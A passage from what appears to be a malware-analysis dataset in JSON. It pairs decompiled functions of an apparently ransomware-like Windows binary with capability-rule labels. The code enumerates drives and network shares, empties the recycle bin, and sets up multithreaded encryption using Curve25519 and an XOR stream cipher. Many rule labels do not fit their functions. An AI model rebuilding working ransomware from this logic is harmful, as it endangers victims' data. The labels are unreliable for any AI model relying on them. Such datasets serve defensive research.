(*_sym.imp.KERNEL32.dll_lstrcatW)(&var_e4h, *lpString1);\n                            fcn.0040a6d0(&var_e4h);\n                        }\n                    }\n                }\n                lpString1 = lpString1 + 3;\n            }\n            sub.NETAPI32.dll_NetApiBufferFree(var_14h);\n        }\n    } while (var_ch == 0xea);\n    return;\n}\n",
        "token_count": 495
    },
    "0040abc0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040abc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpRootPathName;\n    \n    lpRootPathName = fcn.00412ef0(0xe);\n    if (lpRootPathName != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpRootPathName, 0x403c9c);\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpRootPathName + 10, 0x403ca8);\n        *(lpRootPathName + 8) = arg_8h;\n        var_ch = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(lpRootPathName);\n        if ((var_ch != 0) && (var_ch != 5)) {\n            if (var_ch == 4) {\n                var_10h = 0x104;\n                var_8h = fcn.00412ef0(0x208);\n                if (var_8h != 0) {\n                    iVar1 = sub.MPR.dll_WNetGetConnectionW(lpRootPathName + 8, var_8h, &var_10h);\n                    if (iVar1 == 0) {\n                        fcn.0040a6d0(var_8h);\n                    }\n                    fcn.00412f20(var_8h);\n                }\n            }\n            else {\n                fcn.0040a6d0(lpRootPathName);\n            }\n        }\n        fcn.00412f20(lpRootPathName);\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "null": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpSystemInfo;\n    int32_t var_74h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint lpString1;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint32_t hObject;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t lpHandles;\n    uint var_18h;\n    uint16_t *var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t lpString;\n    uint32_t nCount;\n    \n    fcn.0040fed0();\n    fcn.00412e70();\n    *0x414270 = fcn.00404b80();\n    if (*0x414270 != 0) {\n        var_18h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(&var_18h);\n        var_38h = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)(uVar2);\n        (*_sym.imp.KERNEL32.dll_SetProcessShutdownParameters)(0, 0);\n        var_44h = fcn.00404d20(var_18h, var_38h, 0x403cac);\n        if (var_44h != 0) {\n            *0x414130 = var_44h;\n            fcn.00404ec0(var_44h);\n            *0x41426c = 1;\n        }\n        fcn.00404870();\n        fcn.00404ab0();\n        fcn.004047d0();\n        (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinA)(0, 0, 7);\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n        var_5ch = var_74h;\n        var_54h = var_74h * 4;\n        nCount = var_54h >> 1;\n        fcn.00412f40(0x41420c, var_74h * 0x18);\n        fcn.00412f40(0x41423c, nCount * 3);\n        lpHandles = fcn.00412ef0(nCount << 2);\n        var_20h = fcn.00412ef0(nCount << 2);\n        if ((lpHandles != 0) && (var_20h != 0)) {\n            fcn.00412e80(lpHandles, 0, nCount << 2);\n            fcn.00412e80(var_20h, 0, nCount << 2);\n            for (var_24h = 0; var_24h < nCount; var_24h = var_24h + 1) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040a8d0, 1, 0, 0);\n                *(lpHandles + var_24h * 4) = uVar2;\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040a8d0, 0, 0, 0);\n                *(var_20h + var_24h * 4) = uVar2;\n            }\n            lpString2 = fcn.00404d20(var_18h, var_38h, 0x403cb8);\n            lpString = fcn.00404d20(var_18h, var_38h, 0x403cc8);\n            if (lpString2 != 0) {\n                var_2ch = 1;\n                var_60h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n                for (var_28h = 0; var_28h < var_60h; var_28h = var_28h + 1) {\n                    if (*(lpString2 + var_28h * 2) == 0x2c) {\n                        *(lpString2 + var_28h * 2) = 0;\n                        var_2ch = var_2ch + 1;\n                    }\n                }\n                do {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n                    lpString1 = fcn.00412ef0(iVar3 * 2 + 2);\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString1, lpString2);\n                    fcn.0040aa90(lpString1);\n                    fcn.00412f20(lpString1);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n                    lpString2 = lpString2 + 2 + iVar3 * 2;\n                    var_2ch = var_2ch + -1;\n                } while (var_2ch != 0);\n            }\n            if (lpString != 0) {\n                var_34h = 1;\n                var_64h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n                for (var_30h = 0; var_30h < var_64h; var_30h = var_30h + 1) {\n                    if (*(lpString + var_30h * 2) == 0x2c) {\n                        *(lpString + var_30h * 2) = 0;\n                        var_34h = var_34h + 1;\n                    }\n                }\n                do {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n                    var_14h = fcn.00412ef0(iVar3 * 2 + 2);\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_14h);\n                    if ((iVar3 == 2) && (var_14h[1] == 0x3a)) {\n                        fcn.0040abc0(*var_14h);\n                    }\n                    else {\n                        fcn.0040a6d0(var_14h);\n                    }\n                    fcn.00412f20(var_14h);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n                    lpString = lpString + 2 + iVar3 * 2;\n                    var_34h = var_34h + -1;\n                } while (var_34h != 0);\n            }\n            if (((lpString == 0) && (lpString2 == 0)) &&\n               (iVar3 = (*_sym.imp.KERNEL32.dll_OpenMutexA)(0x1f0001, 0, 0x403cd4),  iVar3 == 0)) {\n                (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0x403cf4);\n                var_58h = 0;\n                cVar1 = fcn.00404c20(var_18h, var_38h, 0x403d14);\n                if (cVar1 == '\\x01') {\n                    fcn.0040a9c0(var_58h);\n                }\n                fcn.004045a0();\n                var_40h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                if (var_40h != 0) {\n                    for (var_10h._0_2_ = 0x41; var_10h < 0x5b; var_10h._0_2_ = var_10h + 1) {\n                        if ((var_40h & 1) != 0) {\n                            fcn.0040abc0(var_10h);\n                        }\n                        var_40h = var_40h >> 1;\n                    }\n                }\n                cVar1 = fcn.00404c20(var_18h, var_38h, 0x403d1c);\n                if (cVar1 == '\\0') {\n                    fcn.0040a9c0(var_58h);\n                }\n            }\n            for (var_4ch = 0; var_4ch < nCount; var_4ch = var_4ch + 1) {\n                fcn.00413060(0x41423c, 0, 1);\n            }\n            (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(nCount, lpHandles, 1, 0xffffffff);\n            for (var_50h = 0; var_50h < nCount; var_50h = var_50h + 1) {\n                fcn.00413060(0x41420c, 0, 1);\n            }\n            (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(nCount, var_20h, 1, 0xffffffff);\n            fcn.004047d0();\n            for (hObject = 0; hObject < nCount; hObject = hObject + 1) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(lpHandles + hObject * 4));\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(var_20h + hObject * 4));\n            }\n            fcn.00412f20(lpHandles);\n            fcn.00412f20(var_20h);\n        }\n        if (*0x41426c != 0) {\n            fcn.00404f00();\n        }\n        (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(*0x414270, 0);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    return;\n}\n",
        "token_count": 2256
    },
    "004102d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004102d0(uint noname_0, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h, uint32_t arg_18h)\n\n{\n    uint32_t var_44h;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t var_4h;\n    \n    for (; 0x3f < arg_18h; arg_18h = arg_18h - 0x40) {\n        fcn.0040b280(arg_ch, &var_44h);\n        *arg_14h = *arg_10h ^ var_44h;\n        arg_14h[1] = arg_10h[1] ^ uStack68;\n        arg_14h[2] = arg_10h[2] ^ uStack64;\n        arg_14h[3] = arg_10h[3] ^ uStack60;\n        arg_14h[4] = arg_10h[4] ^ uStack56;\n        arg_14h[5] = arg_10h[5] ^ uStack52;\n        arg_14h[6] = arg_10h[6] ^ uStack48;\n        arg_14h[7] = arg_10h[7] ^ uStack44;\n        arg_14h[8] = arg_10h[8] ^ uStack40;\n        arg_14h[9] = arg_10h[9] ^ uStack36;\n        arg_14h[10] = arg_10h[10] ^ uStack32;\n        arg_14h[0xb] = arg_10h[0xb] ^ uStack28;\n        arg_14h[0xc] = arg_10h[0xc] ^ uStack24;\n        arg_14h[0xd] = arg_10h[0xd] ^ uStack20;\n        arg_14h[0xe] = arg_10h[0xe] ^ uStack16;\n        arg_14h[0xf] = arg_10h[0xf] ^ uStack12;\n        arg_10h = arg_10h + 0x10;\n        arg_14h = arg_14h + 0x10;\n    }\n    if (arg_18h != 0) {\n        fcn.0040b280(arg_ch, &var_44h);\n        for (var_4h = 0; var_4h < arg_18h; var_4h = var_4h + 1) {\n            *(arg_14h + var_4h) = *(arg_10h + var_4h) ^ *(&var_44h + var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 720
    },
    "004105e0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004105e0(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0x676e6f64;\n    while( true ) {\n        if (arg_ch == 0) break;\n        var_4h = var_4h << 8 ^ *((var_4h >> 0x18 ^ *arg_8h) * 4 + 0x403d28);\n        arg_8h = arg_8h + 1;\n        arg_ch = arg_ch + -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 154
    },
    "00410690": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410690(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint var_98h;\n    uint32_t auStack152 [31];\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch;\n    var_ch = arg_10h;\n    for (var_4h = 0; var_4h < 4; var_4h = var_4h + 1) {\n        *(arg_8h + 0xc4 + var_4h * 4) = *(arg_8h + 0xc4 + var_4h * 4) + var_ch;\n        var_10h = *(arg_8h + 0xc4 + var_4h * 4) < var_ch;\n        var_ch = var_10h;\n    }\n    if ((*(arg_8h + 0xc0) == 0) || (0x7f < *(arg_8h + 0xc0) + arg_10h)) {\n        while (0x7f < *(arg_8h + 0xc0) + arg_10h) {\n            fcn.00412eb0(arg_8h + 0x40 + *(arg_8h + 0xc0), var_8h, 0x80 - *(arg_8h + 0xc0));\n            var_8h = (0x80 - *(arg_8h + 0xc0)) + var_8h;\n            arg_10h = arg_10h - (0x80 - *(arg_8h + 0xc0));\n            for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n                var_14h = *(arg_8h + 0x40 + var_4h * 8) << 0x18 | *(arg_8h + 0x41 + var_4h * 8) << 0x10 |\n                          *(arg_8h + 0x42 + var_4h * 8) << 8 | *(arg_8h + 0x43 + var_4h * 8);\n                var_18h = *(arg_8h + 0x44 + var_4h * 8) << 0x18 | *(arg_8h + 0x45 + var_4h * 8) << 0x10 |\n                          *(arg_8h + 0x46 + var_4h * 8) << 8 | *(arg_8h + 0x47 + var_4h * 8);\n                auStack152[var_4h * 2 + -1] = var_14h;\n                auStack152[var_4h * 2] = var_18h;\n            }\n            fcn.00410be0(arg_8h, &var_98h);\n            *(arg_8h + 0xc0) = 0;\n        }\n        fcn.00412eb0(arg_8h + 0x40, var_8h, arg_10h);\n        *(arg_8h + 0xc0) = arg_10h;\n    }\n    else {\n        fcn.00412eb0(arg_8h + 0x40 + *(arg_8h + 0xc0), arg_ch, arg_10h);\n        *(arg_8h + 0xc0) = *(arg_8h + 0xc0) + arg_10h;\n    }\n    return;\n}\n",
        "token_count": 847
    },
    "004108d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004108d0(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint arg_80h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_b0h;\n    uint var_30h;\n    uint32_t auStack48 [3];\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0xc0) < 0x70) {\n        var_10h = 0x70 - *(arg_8h + 0xc0);\n    }\n    else {\n        var_10h = 0xf0 - *(arg_8h + 0xc0);\n    }\n    var_4h = 4;\n    while( true ) {\n        var_18h = var_4h;\n        iVar3 = var_4h + -1;\n        if (var_4h == 0) break;\n        var_1ch = *(arg_8h + 0xc4 + iVar3 * 4);\n        if (iVar3 < 1) {\n            var_14h = 0;\n        }\n        else {\n            var_14h = *(arg_8h + 0xc0 + iVar3 * 4);\n        }\n        var_20h = var_14h;\n        auStack48[var_4h + -2] = var_1ch << 3 | var_14h >> 0x1d;\n        var_4h = iVar3;\n    }\n    var_4h = iVar3;\n    fcn.00412e80(&var_b0h, 0, var_10h);\n    var_b0h._0_1_ = 0x80;\n    fcn.00410690(arg_8h, &var_b0h, var_10h);\n    for (var_4h = 0; var_4h < 4; var_4h = var_4h + 1) {\n        *(&var_b0h + var_4h) = auStack48[2 - var_4h] >> 0x18;\n        *(&var_b0h + var_4h * 4 + 1) = auStack48[2 - var_4h] >> 0x10;\n        *(&var_b0h + var_4h * 4 + 2) = auStack48[2 - var_4h] >> 8;\n        *(&var_b0h + var_4h * 4 + 3) = auStack48[2 - var_4h];\n    }\n    fcn.00410690(arg_8h, &var_b0h, 0x10);\n    for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n        uVar1 = *(arg_8h + var_4h * 8);\n        uVar2 = *(arg_8h + 4 + var_4h * 8);\n        *(arg_ch + var_4h * 8) = uVar1 >> 0x18;\n        *(arg_ch + 1 + var_4h * 8) = uVar1 >> 0x10;\n        *(arg_ch + 2 + var_4h * 8) = uVar1 >> 8;\n        *(arg_ch + 3 + var_4h * 8) = uVar1;\n        *(arg_ch + 4 + var_4h * 8) = uVar2 >> 0x18;\n        *(arg_ch + 5 + var_4h * 8) = uVar2 >> 0x10;\n        *(arg_ch + 6 + var_4h * 8) = uVar2 >> 8;\n        *(arg_ch + 7 + var_4h * 8) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 1099
    },
    "00412ef0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00412ef0(int32_t dwBytes)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    do {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x414274, 8, dwBytes + 0x40);\n    } while (iVar1 == 0);\n    return iVar1;\n}\n",
        "token_count": 86
    },
    "00412fc0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412fc0(uint *lpCriticalSection, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    *arg_10h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(lpCriticalSection[1], 0);\n    if (iVar2 != 0) {\n        if (arg_ch == 0) {\n            *arg_10h = 0xffffffff;\n            return 0;\n        }\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(lpCriticalSection[1], 0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 2);\n    uVar1 = *(lpCriticalSection[9] + lpCriticalSection[0xb] * 4);\n    lpCriticalSection[0xb] = (lpCriticalSection[0xb] + 1) % lpCriticalSection[8];\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 2);\n    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*lpCriticalSection, 1, 0);\n    return uVar1;\n}\n",
        "token_count": 263
    },
    "00413060": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413060(uint *lpCriticalSection, int32_t lpString, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*lpCriticalSection, 0);\n    if (iVar1 != 0) {\n        if (arg_10h == 0) {\n            return 0;\n        }\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*lpCriticalSection, 0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 2);\n    var_4h = 0;\n    if (lpString != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n        iVar1 = iVar1 * 2 + 2;\n        var_4h = fcn.00412ef0(iVar1);\n        fcn.00412eb0(var_4h, lpString, iVar1);\n    }\n    *(lpCriticalSection[9] + lpCriticalSection[10] * 4) = var_4h;\n    lpCriticalSection[10] = (lpCriticalSection[10] + 1) % lpCriticalSection[8];\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 2);\n    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(lpCriticalSection[1], 1, 0);\n    return 1;\n}\n",
        "token_count": 330
    },
    "00404f20": {
        "rules": [
            "encrypt data using Curve25519/f8ce07bf90384b3481717cbf54aaf528"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404f20(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_16ch;\n    uint var_11ch;\n    uint var_cch;\n    uint var_7ch;\n    uint var_24h;\n    uint8_t uStack9;\n    int32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 0x20; var_4h = var_4h + 1) {\n        *(&var_24h + var_4h) = *(arg_ch + var_4h);\n    }\n    var_24h._0_1_ = var_24h & 0xf8;\n    uStack9 = uStack9 & 0x7f | 0x40;\n    fcn.00407cb0(&var_cch, arg_10h);\n    fcn.00409060(&var_16ch, &var_7ch, &var_24h, &var_cch);\n    fcn.00409370(&var_11ch, &var_7ch);\n    fcn.00406f00(&var_7ch, &var_16ch, &var_11ch);\n    fcn.00408290(arg_8h, &var_7ch);\n    return 0;\n}\n",
        "token_count": 300
    },
    "00405020": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405020(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 2) {\n        uVar2 = *(arg_8h + var_4h * 8);\n        puVar1 = arg_ch + var_4h * 8;\n        uVar3 = *puVar1;\n        iVar4 = *(arg_ch + 4 + var_4h * 8);\n        *(arg_8h + var_4h * 8) = uVar2 + *puVar1;\n        *(arg_8h + 4 + var_4h * 8) = *(arg_8h + 4 + var_4h * 8) + iVar4 + CARRY4(uVar2, uVar3);\n        uVar2 = *(arg_8h + 8 + var_4h * 8);\n        puVar1 = arg_ch + 8 + var_4h * 8;\n        uVar3 = *puVar1;\n        iVar4 = *(arg_ch + 0xc + var_4h * 8);\n        *(arg_8h + 8 + var_4h * 8) = uVar2 + *puVar1;\n        *(arg_8h + 0xc + var_4h * 8) = *(arg_8h + 0xc + var_4h * 8) + iVar4 + CARRY4(uVar2, uVar3);\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "004050a0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050a0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        uVar2 = *(arg_ch + var_4h * 8);\n        puVar1 = arg_8h + var_4h * 8;\n        uVar3 = *puVar1;\n        iVar4 = *(arg_ch + 4 + var_4h * 8);\n        *(arg_8h + var_4h * 8) = uVar2 - *puVar1;\n        *(arg_8h + 4 + var_4h * 8) = (iVar4 - *(arg_8h + 4 + var_4h * 8)) - (uVar2 < uVar3);\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "004050f0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050f0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    ulong uVar1;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        uVar1 = fcn.00413150();\n        *(arg_8h + var_4h * 8) = uVar1;\n        *(arg_8h + 4 + var_4h * 8) = uVar1 >> 0x20;\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00406c90": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406c90(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    ulong uVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    arg_8h[0x14] = 0;\n    arg_8h[0x15] = 0;\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 2) {\n        uVar3 = fcn.00406c10(arg_8h[var_4h * 2], arg_8h[var_4h * 2 + 1]);\n        uVar4 = fcn.00413190();\n        uVar1 = arg_8h[var_4h * 2];\n        uVar2 = arg_8h[var_4h * 2 + 1];\n        arg_8h[var_4h * 2] = uVar1 - uVar4;\n        arg_8h[var_4h * 2 + 1] = (uVar2 - (uVar4 >> 0x20)) - (uVar1 < uVar4);\n        uVar1 = arg_8h[var_4h * 2 + 2];\n        arg_8h[var_4h * 2 + 2] = uVar1 + uVar3;\n        arg_8h[var_4h * 2 + 3] = arg_8h[var_4h * 2 + 3] + (uVar3 >> 0x20) + CARRY4(uVar1, uVar3);\n        uVar3 = fcn.00406c50(arg_8h[var_4h * 2 + 2], arg_8h[var_4h * 2 + 3]);\n        uVar4 = fcn.00413190();\n        uVar1 = arg_8h[var_4h * 2 + 2];\n        arg_8h[var_4h * 2 + 2] = uVar1 - uVar4;\n        arg_8h[var_4h * 2 + 3] = (arg_8h[var_4h * 2 + 3] - (uVar4 >> 0x20)) - (uVar1 < uVar4);\n        uVar1 = arg_8h[var_4h * 2 + 4];\n        arg_8h[var_4h * 2 + 4] = uVar1 + uVar3;\n        arg_8h[var_4h * 2 + 5] = arg_8h[var_4h * 2 + 5] + (uVar3 >> 0x20) + CARRY4(uVar1, uVar3);\n    }\n    uVar3 = fcn.00413190();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar3 + *arg_8h;\n    arg_8h[1] = (uVar3 >> 0x20) + arg_8h[1] + CARRY4(uVar3, uVar1);\n    uVar3 = fcn.00413190();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar3 + *arg_8h;\n    arg_8h[1] = (uVar3 >> 0x20) + arg_8h[1] + CARRY4(uVar3, uVar1);\n    uVar1 = *arg_8h;\n    *arg_8h = uVar1 + arg_8h[0x14];\n    arg_8h[1] = arg_8h[1] + arg_8h[0x15] + CARRY4(uVar1, arg_8h[0x14]);\n    arg_8h[0x14] = 0;\n    arg_8h[0x15] = 0;\n    uVar3 = fcn.00406c10(*arg_8h, arg_8h[1]);\n    uVar4 = fcn.00413190();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar1 - uVar4;\n    arg_8h[1] = (arg_8h[1] - (uVar4 >> 0x20)) - (uVar1 < uVar4);\n    uVar1 = arg_8h[2];\n    arg_8h[2] = uVar1 + uVar3;\n    arg_8h[3] = arg_8h[3] + (uVar3 >> 0x20) + CARRY4(uVar1, uVar3);\n    return;\n}\n",
        "token_count": 1086
    },
    "00408fe0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408fe0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        uVar2 = (*(arg_8h + var_4h * 8) ^ *(arg_ch + var_4h * 8)) & -arg_10h;\n        uVar1 = *(arg_8h + var_4h * 8) ^ uVar2;\n        *(arg_8h + var_4h * 8) = uVar1;\n        *(arg_8h + 4 + var_4h * 8) = uVar1 >> 0x1f;\n        uVar2 = *(arg_ch + var_4h * 8) ^ uVar2;\n        *(arg_ch + var_4h * 8) = uVar2;\n        *(arg_ch + 4 + var_4h * 8) = uVar2 >> 0x1f;\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "00409370": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
